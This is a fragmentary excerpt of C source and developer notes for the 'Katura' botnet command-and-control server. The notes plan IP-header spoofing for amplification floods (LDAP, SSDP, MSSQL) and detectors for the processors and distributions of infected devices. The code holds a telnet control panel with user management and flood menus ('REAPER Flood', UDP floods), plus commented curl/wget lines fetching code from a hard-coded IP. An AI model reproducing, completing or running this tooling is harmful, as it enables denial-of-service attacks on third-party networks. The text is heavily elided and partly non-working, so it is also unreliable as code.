...
Adding: IP Header Modifcation Extensions, Includes ["LDAP", "MSSQL", "TCP-CRI", "PROWIN", "YUBINA", "SENTINEL", "SSDP", "TS3", "Katura"] || Adding More!
_____________________
...
Added: Individual Arch Detector(s) for ARM Device Processors Covering ARMv6-M	- ARMv8.2-A	wrapping over the	Cortex-Processor Tree 
["Cortex-M35P", "Cortex-A76", "Cortex-R4", "Cortex-R5", "Cortex-R7", "Cortex-A7",	"Cortex-M0", "Cortex-A53", "Cortex-A57", "Cortex-A12", "Cortex-M7", "Cortex-A17", "Cortex-A35", "Cortex-A72", "Cortex-M23", "Cortex-M33", "Cortex-R8", "Cortex-R52", "Cortex-A32", "Cortex-A73", "Cortex-A55", "Cortex-A75", "Cortex-M35P", "Cortex-A76"]
Added: Distro Detector via ["Ubuntu/Debian", "Gentoo", "REHL/Centos", "Open Suse", "BusyBox"]
...
-------------------------
Must Fix Input For IP Header Modifcations || If this can-not be done we will convert to using the bot for sending Spoofed-Based Attacks!
...
Must add extensions for all layer7 spoofed based methods, im not entirely sure how to use all of them so i dont know what comes after the ./$file || find the ouput and add it to layer7spoof
_____________________
...
// #include "C2/headers/reps/realtek.h"								
// curl: curl 'http://158.69.204.184/Traffic/resolver.h' >> resolver.h
// wget: wget -q http://158.69.204.184/Traffic/resolver.h -O resolver.h
// link: http://158.69.204.184/Traffic/resolver.h
  ...
  while (1)
  {
    ...
    for (i = 0; i < n; i++)
    {
      if ((events[i].events & EPOLLERR) || (events[i].events & EPOLLHUP) || (!(events[i].events & EPOLLIN)))
      {
        ...
        // clients[events[i].data.fd].x84_32 = 0;
...
void *telnetWorker(void *sock) {    // telnet worker
  ...
  if (strcmp(nickstring, accounts[find_line].username) == 0) {
    ...
    failed:
        ...
        // clear
		    sprintf(katura_1, "\x1b[38;5;50mKatura \x1b[38;5;82mI, \x1b[38;5;196m[\x1b[38;5;82mPrivate Source\x1b[38;5;196m]\r\n");
...
// x84_32
      ...
      trim(url);
      resolve(url, ip);                                                                       // resolve output, THIS DO NOT WORK
            ...
            if(strstr(buf, "adduser") || strstr(buf, "ADDUSER"))                              // add user function
    {
      ...
      else
      {
        ...
        sprintf(help_coms11,  "\x1b[38;5;196m[\x1b[38;5;50mEXTRA Rueles\x1b[38;5;196m]         \x1b[38;5;50mEXTRA\r\n");
        ...
        sprintf(clp_1, "\x1b[38;5;50mKatura \x1b[38;5;82mI, \x1b[38;5;196m[\x1b[38;5;82mPrivate Source\x1b[38;5;196m]\r\n");
        ...
        char l4udp_udp6  [5000];
        char l4udp_udp7  [5000];
        char l4udp_udp8  [5000];
...
// \x1b[38;5;196m == red
        ...
        sprintf(spoof_5,      "\x1b[38;5;196m[\x1b[38;5;50mREAPER Flood\x1b[38;5;196m]   \x1b[38;5;196m// \x1b[38;5;50mREAPER   \x1b[38;5;196m[\x1b[38;5;50mIP\x1b[38;5;196m] [\x1b[38;5;50mPORT\x1b[38;5;196m] [\x1b[38;5;50mTIME\x1b[38;5;196m]\r\n");
        ...
        {  // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Attack Stopped!");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
        ...
        if(strstr(buf, "// reaper") || strstr(buf, "// REAPER")) // We Are Reading Client Using IP Header Modifications and Sending katura Flood!
        {    // Let Us Continue Our Journey!
        sprintf(katura, "\x1b[38;5;196m[\x1b[38;5;50mKatura\x1b[38;5;196m] Sending \x1b[38;5;50mKatura \x1b[38;5;196mFlood!\r\n");
        if(send(thefd, katura, strlen(katura), MSG_NOSIGNAL) == -1) return;
        }  // Let Us Continue Our Journey!
...
int main (int argc, char *argv[], void *sock)
{
        ...
        if (argc != 4)
        {
        fprintf (stderr, "\x1b[38;5;196mUsage: %s \x1b[38;5;82m[\x1b[38;5;196mport\x1b[38;5;82m] [\x1b[38;5;196mthreads\x1b[38;5;82m] [\x1b[38;5;196mcnc-port\x1b[38;5;82m]\x1b[38;5;82m\n", argv[0]);
        exit (EXIT_FAILURE);
        }
        port = atoi(argv[3]);
        threads = atoi(argv[2]);
